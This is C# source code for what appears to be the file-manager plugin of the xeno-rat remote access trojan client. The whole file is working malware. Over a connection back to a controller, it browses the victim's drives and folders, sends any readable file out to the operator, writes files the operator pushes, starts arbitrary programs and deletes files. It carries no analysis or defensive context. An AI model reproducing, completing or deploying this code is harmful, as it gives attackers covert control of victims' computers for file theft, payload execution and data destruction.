using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected

            while (node.Connected())
            {
                try
                {
                    byte[] id = await node.ReceiveAsync();
                    if (id != null)
                    {
                        int nodeid = node.sock.BytesToInt(id);
                        Node tempnode = null;
                        foreach (Node i in node.Parent.subNodes)
                        {
                            if (i.SetId == nodeid)
                            {
                                await node.SendAsync(new byte[] { 1 });
                                tempnode = i;
                                break;
                            }
                        }
                        if (tempnode == null)
                        {
                            await node.SendAsync(new byte[] { 0 });
                            continue;
                        }
                        node.AddSubNode(tempnode);
                        FileManagerHandler(tempnode);
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    break;
                }
            }
            node.Disconnect();


        }
        private async Task FileManagerHandler(Node node)
        {
            byte[] typedata = await node.ReceiveAsync();
            if (typedata == null)
            {
                node.Disconnect();
            }
            int type = typedata[0];
            if (type == 0)
            {
                await FileViewer(node);
            }
            else if (type == 1)
            {
                await FileUploader(node);
                //file download
            }
            else if (type == 2)
            {
                await FileDownloader(node);
                //file upload
            }
            else if (type == 3)
            {
                await StartFile(node);
            }
            else if (type == 4)
            {
                await DeleteFile(node);
            }
            GC.Collect();
        }
        private async Task DeleteFile(Node node)
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                node.Disconnect();
                return;
            }
            string path = Encoding.UTF8.GetString(data);
            try
            {
                File.Delete(path);
                await node.SendAsync(success);
            }
            catch
            {
                await node.SendAsync(fail);
            }
        }
        private async Task StartFile(Node node)
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                node.Disconnect();
                return;
            }
            string path = Encoding.UTF8.GetString(data);
            try
            {
                Process.Start(path);
                await node.SendAsync(success);
            }
            catch 
            {
                await node.SendAsync(fail);
            }
        }
        private async Task<bool> CanRead(string path) 
        {
            try
            {
                char[] buffer = new char[1];
                using (StreamReader reader = new StreamReader(path))
                {
                    await reader.ReadAsync(buffer, 0, buffer.Length);
                }
                return true;
            }
            catch 
            { 
                
            }
            return false;
        }
        public bool CanWrite(string path)
        {
            if (string.IsNullOrEmpty(path))
            {
                return false;
            }

            if (File.Exists(path))
            {
                try
                {
                    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Write))
                    {
                        // Successfully opened the file with write access
                        fileStream.Close();
                    }
                }
                catch
                {
                    return false;
                }

                try
                {
                    // Delete the file if it exists and write access was confirmed
                    File.Delete(path);
                }
                catch
                {
                    return false;
                }
            }
            else if (Directory.Exists(Path.GetDirectoryName(path)))
            {
                string tempFilePath = Path.Combine(Path.GetDirectoryName(path), Guid.NewGuid().ToString());
                try
                {
                    using (FileStream fileStream = new FileStream(tempFilePath, FileMode.CreateNew, FileAccess.Write))
                    {
                        // Successfully created the file, so you can write to the directory
                        fileStream.Close();
                    }
                    File.Delete(tempFilePath);
                }
                catch 
                {
                    return false;
                }
                return true;
            }

            return false;
        }

        private async Task FileDownloader(Node node)
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                node.Disconnect();
                return;
            }
            string path = Encoding.UTF8.GetString(data);
            if (!CanWrite(path))
            {
                await node.SendAsync(fail);
                node.Disconnect();
                return;
            }
            await node.SendAsync(success);
            try
            {
                using (FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.Write))
                {
                    while (true)
                    {
                        byte[] fileData = await node.ReceiveAsync();
                        if (fileData == null)
                        {
                            node.Disconnect();
                            return;
                        }
                        await fileStream.WriteAsync(fileData, 0, fileData.Length);
                        if (fileData.Length < 500000)
                        {
                            break;
                        }
                    }
                }
            }
            catch
            {
            }
            await Task.Delay(500);
            node.Disconnect();
        }
        private async Task FileUploader(Node node)
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            byte[] data=await node.ReceiveAsync();
            if (data == null) 
            {
                node.Disconnect();
                return;
            }
            string path=Encoding.UTF8.GetString(data);
            if (!await CanRead(path)) 
            {
                await node.SendAsync(fail);
                node.Disconnect();
                return;
            }
            await node.SendAsync(success);
            long length = new FileInfo(path).Length;
            await node.SendAsync(LongToBytes(length));
            using (FileStream stream = new FileStream(path, FileMode.Open, FileAccess.Read))
            {
                byte[] block = new byte[500000];
                int readcount;

                while ((readcount = await stream.ReadAsync(block, 0, block.Length)) > 0)
                {
                    byte[] blockBytes = new byte[readcount];
                    Array.Copy(block, blockBytes, readcount);
                    await node.SendAsync(blockBytes);
                }
            }
            await Task.Delay(500);
            node.Disconnect();
        }
        private async Task FileViewer(Node node) 
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            while (node.Connected()) 
            {
                byte[] data=await node.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                string path=Encoding.UTF8.GetString(data);
                try 
                {
                    string[] Directories = { };
                    string[] Files = { };
                    if (path == "")
                    {
                        Directories = System.IO.Directory.GetLogicalDrives();
                    }
                    else 
                    {
                        Directories = Directory.GetDirectories(path);
                        Files=Directory.GetFiles(path);
                    }
                    await node.SendAsync(success);
                    await node.SendAsync(node.sock.IntToBytes(Directories.Length));
                    foreach (string i in Directories) 
                    {
                        await node.SendAsync(Encoding.UTF8.GetBytes(i));
                    }
                    await node.SendAsync(node.sock.IntToBytes(Files.Length));
                    foreach (string i in Files)
                    {
                        await node.SendAsync(Encoding.UTF8.GetBytes(i));
                    }
                }
                catch 
                {
                    await node.SendAsync(fail);
                }
                //if path is empty use string[] drives = System.IO.Directory.GetLogicalDrives(); . return all the drives
                //use path to get files and such
            }
            node.Disconnect();
        }
        public long BytesToLong(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return (long)data[offset] |
                       (long)data[offset + 1] << 8 |
                       (long)data[offset + 2] << 16 |
                       (long)data[offset + 3] << 24 |
                       (long)data[offset + 4] << 32 |
                       (long)data[offset + 5] << 40 |
                       (long)data[offset + 6] << 48 |
                       (long)data[offset + 7] << 56;
            }
            else
            {
                return (long)data[offset + 7] |
                       (long)data[offset + 6] << 8 |
                       (long)data[offset + 5] << 16 |
                       (long)data[offset + 4] << 24 |
                       (long)data[offset + 3] << 32 |
                       (long)data[offset + 2] << 40 |
                       (long)data[offset + 1] << 48 |
                       (long)data[offset] << 56;
            }
        }

        public byte[] LongToBytes(long data)
        {
            byte[] bytes = new byte[8];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
                bytes[4] = (byte)(data >> 32);
                bytes[5] = (byte)(data >> 40);
                bytes[6] = (byte)(data >> 48);
                bytes[7] = (byte)(data >> 56);
            }
            else
            {
                bytes[7] = (byte)data;
                bytes[6] = (byte)(data >> 8);
                bytes[5] = (byte)(data >> 16);
                bytes[4] = (byte)(data >> 24);
                bytes[3] = (byte)(data >> 32);
                bytes[2] = (byte)(data >> 40);
                bytes[1] = (byte)(data >> 48);
                bytes[0] = (byte)(data >> 56);
            }

            return bytes;
        }
    }
}